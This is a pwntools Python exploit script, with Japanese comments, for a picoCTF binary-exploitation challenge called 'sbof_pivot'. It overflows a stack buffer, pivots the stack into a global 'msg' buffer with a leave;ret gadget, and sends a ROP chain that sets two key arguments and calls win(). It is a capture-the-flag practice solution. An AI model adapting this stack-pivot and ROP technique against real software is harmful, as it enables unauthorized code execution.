from pwn import *

bin_file = './sbof_pivot'
context(os = 'linux', arch = 'amd64')

binf = ELF( bin_file )

info( f"binf.bss()=0x{binf.bss():X}, binf.symbols['msg']=0x{binf.symbols['msg']:X}" )
info( f"binf.functions['win'].address=0x{binf.functions['win'].address:X}" )

def attack( proc, **kwargs ):
    
    rop = ROP( binf )
    
    ropchain = b''
    ropchain += b'A' * 8                  # name
    ropchain += b'B' * 8                  # name
    ropchain += p64( binf.symbols['msg'] + 0xc0 - 8 ) # Saved RBP (0xc0 は win関数で使うスタック量を考慮)
    ropchain += p64( rop.leave.address )  # leave; ret;
    
    #info( proc.sendlineafter(b'>> ', ropchain[:-1]).decode() ) # なぜか、sendlineafter() ではうまくいかない
    info( proc.sendafter(b'>> ', ropchain[:-1]).decode() ) # fgets() は自動で、NULL終端するため、1byte手前まで送信する
    
    ropchain = b''
    ropchain += b'A' * 0xc0
    ropchain += p64( rop.rdi.address )    # pop rdi; ret;
    ropchain += p64( 0xcafebabe )         # key1
    ropchain += p64( rop.rsi.address )    # pop rsi; pop r15; ret;
    ropchain += p64( 0xc0bebeef )         # key2
    ropchain += p64( 0xdeadbeef )         # for r15 (何でもいい)
    ropchain += p64( binf.functions['win'].address ) # win()
    
    #info( proc.sendafter(b'>> ', ropchain).decode() ) # こちらは sendafter() ではうまくいかない
    info( proc.sendlineafter(b'>> ', ropchain).decode() )
    info( proc.recvall().decode() )

def main():
    
    adrs = "shape-facility.picoctf.net"
    port = 51556
    #adrs = "localhost"
    #port = 4000
    
    #proc = gdb.debug( bin_file )
    proc = process( bin_file )
    #proc = remote( adrs, port )
    
    attack( proc )
    #proc.interactive()

if __name__ == '__main__':
    main()
